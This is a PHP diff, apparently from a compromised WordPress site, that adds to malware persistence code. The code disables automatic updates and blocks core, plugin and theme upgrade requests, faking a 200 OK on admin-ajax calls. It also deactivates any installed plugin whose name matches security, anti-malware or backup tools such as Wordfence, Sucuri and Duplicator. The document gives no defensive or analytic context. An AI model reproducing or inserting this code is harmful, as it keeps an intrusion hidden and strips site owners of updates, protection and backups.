@@ -1,15 +1,19 @@
 if (!defined("SHIELD_AND_SWORD")) {
 	define("SHIELD_AND_SWORD", "1");
 	add_filter("automatic_updater_disabled", "__return_true");
-	if (in_array($_GET["action"], array("upgrade-core", "do-core-reinstall", "do-core-upgrade", "do-plugin-upgrade", "do-theme-upgrade"))) {
-		$proto = strpos(strtolower($_SERVER["SERVER_PROTOCOL"]), "https") === FALSE ? "http" : "https";
+	if (in_array($_REQUEST["action"], array("upgrade-core", "upgrade-plugin", "update-plugin", "update-selected-themes", "upgrade-theme", "update-theme", "do-core-reinstall", "do-core-upgrade", "do-plugin-upgrade", "do-theme-upgrade"))) {
+		$proto = strpos(strtolower($_SERVER["SERVER_PROTOCOL"]), "https") === false ? "http" : "https";
 		$redirect_url =  $proto . "://" . $_SERVER["HTTP_HOST"] . $_SERVER["SCRIPT_NAME"];
-		header("Location: " . $redirect_url);
+		if (strpos($_SERVER["REQUEST_URI"], "admin-ajax.php") !== false) {
+			header("HTTP/1.1 200 OK");
+		} else {
+			header("Location: " . $redirect_url);
+		}
 		die();
 	}
 	$plugins = get_plugins();
+	$bad_names = '/wordfence|sucuri|security|malcare|defender|jetpack|malware|wp\-cerber|gotmls|secupress|antivirus|backup|wp\-staging|backwpup|wp\-migration|duplicator/i';
 	foreach ($plugins as $filename => $data) {
-		$bad_names = '/wordfence|sucuri|security|malcare|defender|jetpack|malware|wp\-cerber|gotmls|secupress|antivirus|backup|wp\-staging|backwpup|wp\-migration|duplicator/i';
 		if (preg_match($bad_names, $filename)) {
 			deactivate_plugins($filename);
 		}
